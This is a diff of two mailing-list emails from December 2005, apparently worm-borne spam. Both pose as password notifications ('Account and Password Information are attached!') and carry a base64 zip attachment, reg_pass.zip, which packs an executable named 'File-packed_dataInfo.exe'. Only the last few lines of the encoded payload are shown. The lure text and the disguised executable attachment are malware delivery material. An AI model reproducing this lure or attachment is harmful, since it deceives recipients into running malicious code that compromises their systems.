@@ -1,26 +1,26 @@
-From: office@consultant.com
-Subject: Your Password
-Date: Fri, 16 Dec 2005 21:13:26 UTC
-Message-ID: <5c065dd3a7.cbda503@consultant.com>
+From: Admin@yahoo.co.on.sgi.com
+Subject: Your_Password
+Date: Fri, 16 Dec 2005 21:22:38 UTC
+Message-ID: <bdc38defe42d96eca@yahoo.co.on>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="====cf4794cc3ad.b754cd6979d5e"
+Content-Type: multipart/mixed; boundary="===4b12c060aba1.c08b5b62a6"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: Z-Account@oss.sgi.com
+To: MailIn_Box@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---====cf4794cc3ad.b754cd6979d5e
+--===4b12c060aba1.c08b5b62a6
 
-Protected message is attached!
+Account and Password Information are attached!
 
 
-***** Go to: http://www.consultant.com
-***** Email: postman@consultant.com
---====cf4794cc3ad.b754cd6979d5e
+***** Go to: http://www.yahoo.co.on
+***** Email: postman@yahoo.co.on
+--===4b12c060aba1.c08b5b62a6
 Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
 Content-Disposition: attachment; filename="reg_pass.zip"
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---====cf4794cc3ad.b754cd6979d5e--
+--===4b12c060aba1.c08b5b62a6--
